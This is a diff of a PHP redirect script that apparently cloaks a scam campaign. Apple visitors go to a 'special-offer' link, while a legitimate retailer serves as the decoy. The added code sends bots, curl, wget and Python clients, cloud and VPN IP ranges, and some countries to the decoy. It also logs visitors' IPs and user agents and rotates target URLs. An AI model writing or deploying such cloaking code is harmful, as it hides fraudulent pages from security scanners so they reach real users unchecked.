@@ -1,22 +1,48 @@
 <?php
-// index.php
+$config = json_decode(file_get_contents("config.json"), true);
+$counterFile = "counter.json";
+$counter = file_exists($counterFile) ? json_decode(file_get_contents($counterFile), true) : ['apple' => 0, 'other' => 0];
 
-// URL untuk Apple device
-$appleRedirectUrl = "https://greenauraworld.com/2c3lbs?special-offer&key=heroku";
+$ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
+$deviceType = preg_match('/iPhone|iPad|iPod|Macintosh/i', $userAgent) ? 'apple' : 'other';
 
-// URL untuk non-Apple device
-$otherRedirectUrl = "https://yodobashi.com";
-
-// Ambil user agent
-$userAgent = $_SERVER['HTTP_USER_AGENT'];
-
-// Deteksi apakah user agent mengandung identitas Apple device
-if (preg_match('/iPhone|iPad|iPod|Macintosh/i', $userAgent)) {
-    // Jika Apple device, redirect ke halaman yang diizinkan
-    header("Location: $appleRedirectUrl", true, 302);
-    exit;
-} else {
-    // Jika bukan Apple device, redirect ke halaman lain
-    header("Location: $otherRedirectUrl", true, 302);
-    exit;
+// === BLOCKER SECTION ===
+$botKeywords = ['bot', 'crawl', 'slurp', 'spider', 'curl', 'wget', 'python', 'scrapy'];
+foreach ($botKeywords as $bot) {
+    if (stripos($userAgent, $bot) !== false) {
+        $deviceType = 'other';
+        break;
+    }
 }
+$ipinfoToken = '';
+$infoUrl = "http://ipinfo.io/{$ip}/json" . ($ipinfoToken ? "?token={$ipinfoToken}" : '');
+$ipInfo = @json_decode(@file_get_contents($infoUrl), true);
+$org = $ipInfo['org'] ?? '';
+$country = $ipInfo['country'] ?? '';
+$blockedCountries = ['CN', 'RU', 'KP'];
+$vpnKeywords = ['DigitalOcean', 'Amazon', 'OVH', 'Google', 'Hetzner', 'Microsoft', 'VPN', 'Hostinger'];
+foreach ($vpnKeywords as $kw) {
+    if (stripos($org, $kw) !== false) {
+        $deviceType = 'other';
+        break;
+    }
+}
+if (in_array($country, $blockedCountries)) {
+    $deviceType = 'other';
+}
+
+// === LOGGING & REDIRECT ===
+$logFile = __DIR__ . '/clicklog.txt';
+$timestamp = date('Y-m-d H:i:s');
+$logEntry = "$timestamp|$ip|$userAgent|$deviceType" . PHP_EOL;
+file_put_contents($logFile, $logEntry, FILE_APPEND);
+
+$urls = $config[$deviceType];
+$index = $counter[$deviceType] ?? 0;
+$redirectUrl = $urls[$index] ?? $urls[0];
+$counter[$deviceType] = ($index + 1) % count($urls);
+file_put_contents($counterFile, json_encode($counter));
+
+header("Location: $redirectUrl", true, 302);
+exit;
